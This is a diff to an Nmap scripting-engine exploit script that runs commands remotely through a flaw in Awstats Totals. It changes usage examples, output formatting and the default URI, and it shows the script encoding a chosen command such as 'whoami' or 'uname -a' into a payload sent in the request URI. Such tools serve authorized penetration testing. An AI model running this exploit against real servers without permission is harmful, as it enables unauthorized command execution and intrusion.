@@ -16,17 +16,18 @@ References:
 
 ---
 -- @usage
--- nmap --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' -p80  <host/ip>
--- nmap --script http-awstatstotals-exec.nse -p80 <host/ip>
+-- nmap -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' <target>
+-- nmap -sV --script http-awstatstotals-exec.nse <target>
 --
 -- @output
 -- PORT   STATE SERVICE REASON
 -- 80/tcp open  http    syn-ack
--- |_http-awstatstotals-exec.nse: Linux 2.4.19 #1 Son Apr 14 09:53:28 CEST 2002 i686 GNU/Linux
+-- | http-awstatstotals-exec.nse:
+-- |_Output for 'uname -a':Linux 2.4.19 #1 Son Apr 14 09:53:28 CEST 2002 i686 GNU/Linux
 --
--- @args http-awstatstotals-exec.uri Awstats Totals URI including path
--- @args http-awstatstotals-exec.cmd Command to execute
--- @args http-awstatstotals-exec.outfile Output file
+-- @args http-awstatstotals-exec.uri Awstats Totals URI including path. Default: /index.php
+-- @args http-awstatstotals-exec.cmd Command to execute. Default: whoami
+-- @args http-awstatstotals-exec.outfile Output file. If set it saves the output in this file.
 ---
 -- Other useful args when running this script:
 -- http.useragent - User Agent to use in GET request
@@ -44,7 +45,7 @@ portrule = shortport.http
 
 --default values
 local DEFAULT_CMD = "whoami"
-local DEFAULT_URI = "index.php"
+local DEFAULT_URI = "/index.php"
 
 ---
 --Writes string to file
@@ -92,7 +93,6 @@ action = function(host, port)
     stdnse.print_debug(1, "%s:This does not look like Awstats Totals. Quitting.", SCRIPT_NAME)
     return
   end
-  output[#output+1] = "Command:"..cmd
   
   --Encode payload using PHP's chr() 
   local encoded_payload = ""
@@ -105,7 +105,7 @@ action = function(host, port)
   --set payload and send request
   local req = http.get(host, port, uri .. stealth_payload)
   if req.status and req.status == 200 then
-    output[#output+1] = req.body
+    output[#output+1] = string.format("\nOutput for '%s':%s", cmd, req.body)
 
     --if out set, save output to file
     if out then
